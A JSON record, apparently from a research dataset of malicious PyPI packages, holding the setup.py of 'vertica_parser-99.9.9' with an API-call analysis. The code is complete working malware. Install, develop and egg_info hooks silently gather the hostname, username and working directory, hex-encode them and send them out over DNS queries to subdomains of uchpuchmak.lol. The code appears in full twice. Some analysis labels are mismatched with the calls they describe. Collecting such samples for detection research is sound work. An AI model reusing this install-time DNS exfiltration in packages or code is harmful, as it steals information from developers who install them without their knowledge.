[
  {
    "pyfile": "setup.py",
    "code_snippet": "import json\nimport socket\nimport getpass\nimport os\nimport random\nimport secrets\n\ndef dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):  # A 1, NS 2, CNAME 5, SOA 6, NULL 10, PTR 12, MX 15, TXT 16, AAAA 28, NAPTR 35, * 255\n    name = name.rstrip('.')\n    queryid = secrets.token_bytes(2)\n    # Header. 1 for Recursion Desired, 1 question, 0 answers, 0 ns, 0 additional\n    request = queryid + b'\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0'\n    # Question\n    for label in name.rstrip('.').split('.'):\n        assert len(label) < 64, name\n        request += int.to_bytes(len(label), length=1, byteorder='big')\n        request += label.encode()\n    request += b'\\0'  # terminates with the zero length octet for the null label of the root.\n    request += int.to_bytes(qtype, length=2, byteorder='big')  # QTYPE\n    request += b'\\0\\1'  # QCLASS = 1\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n        s.sendto(request, addr)\n        s.settimeout(timeout)\n        try:\n            response, serveraddr = s.recvfrom(4096)\n        except socket.timeout:\n            pass\n\ndef custom_command():\n    package = 'vertica-parser'\n    domain = 'uchpuchmak.lol'\n    ns1 = f'ns1.{domain}'\n\n    data = {\n        'p': package,\n        'h': socket.gethostname(),\n        'd': getpass.getuser(),\n        'c': os.getcwd()\n    }\n    json_data = json.dumps(data)\n    hex_str = json_data.encode('utf-8').hex()\n    chunks = len(hex_str) // 60\n    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]\n    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)\n\n    for count, value in enumerate(hex_list):\n        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'\n        dns_request(t_str, addr=(ns1, 53))\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()",
    "pattern_analysis": {
      "api_sequence": [
        "secrets.token_bytes",
        "int.to_bytes",
        "str.encode",
        "int.to_bytes",
        "socket.socket",
        "socket.socket.sendto",
        "socket.socket.settimeout",
        "socket.socket.recvfrom",
        "socket.gethostname",
        "getpass.getuser",
        "os.getcwd",
        "json.dumps",
        "str.encode",
        "random.randint",
        "dns_request"
      ],
      "api_sequence_with_args": [
        "secrets.token_bytes(2)",
        "int.to_bytes(len(label), length=1, byteorder='big')",
        "label.encode()",
        "int.to_bytes(qtype, length=2, byteorder='big')",
        "socket.socket(socket.AF_INET, socket.SOCK_DGRAM)",
        "socket.socket.sendto(request, addr)",
        "socket.socket.settimeout(timeout)",
        "socket.socket.recvfrom(4096)",
        "socket.gethostname()",
        "getpass.getuser()",
        "os.getcwd()",
        "json.dumps(data)",
        "json_data.encode('utf-8')",
        "random.randint(36 ** 12, (36 ** 13) - 1)",
        "dns_request(t_str, addr=(ns1, 53))"
      ],
      "mapped_sequence": [
        {
          "api_name": "secrets.token_bytes",
          "id": "create_bytes_encoded",
          "description": "Creates bytes object from encoded string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "int.to_bytes",
          "id": "convert_int_to_bytes",
          "description": "Converts integer to bytes with specified length and byte order",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "int.to_bytes",
          "id": "convert_int_to_bytes",
          "description": "Converts integer to bytes with specified length and byte order",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "socket.socket",
          "id": "create_socket",
          "description": "Creates new socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "socket_creation"
        },
        {
          "api_name": "socket.socket.sendto",
          "id": "send_socket_data",
          "description": "Sends data over socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "socket.socket.settimeout",
          "id": "set_socket_timeout",
          "description": "Sets timeout for socket operations",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "socket_configuration"
        },
        {
          "api_name": "socket.socket.recvfrom",
          "id": "receive_socket_data",
          "description": "Receives data from socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "random.randint",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "dns_request",
          "id": "create_dns_resolver",
          "description": "Creates DNS resolver object with custom configuration",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        }
      ],
      "contextual_code": "import json\nimport socket\nimport getpass\nimport os\nimport random\nimport secrets\n\ndef dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):\n    name = name.rstrip('.')\n    queryid = secrets.token_bytes(2)\n    request = queryid + b'\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0'\n    for label in name.rstrip('.').split('.'):\n        assert len(label) < 64, name\n        request += int.to_bytes(len(label), length=1, byteorder='big')\n        request += label.encode()\n    request += b'\\0'\n    request += int.to_bytes(qtype, length=2, byteorder='big')\n    request += b'\\0\\1'\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n        s.sendto(request, addr)\n        s.settimeout(timeout)\n        try:\n            response, serveraddr = s.recvfrom(4096)\n        except socket.timeout:\n            pass\n\ndef custom_command():\n    package = 'vertica-parser'\n    domain = 'uchpuchmak.lol'\n    ns1 = f'ns1.{domain}'\n\n    data = {\n        'p': package,\n        'h': socket.gethostname(),\n        'd': getpass.getuser(),\n        'c': os.getcwd()\n    }\n    json_data = json.dumps(data)\n    hex_str = json_data.encode('utf-8').hex()\n    chunks = len(hex_str) // 60\n    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]\n    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)\n\n    for count, value in enumerate(hex_list):\n        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'\n        dns_request(t_str, addr=(ns1, 53))"
    }
  },
  {
    "metadata": {
      "package_name": "vertica_parser-99.9.9",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/vertica_parser-99.9.9/vertica_parser-99.9.9/setup.py",
      "code_hash": "f6500eee6cebf6d53116e7838710d82e"
    }
  }
]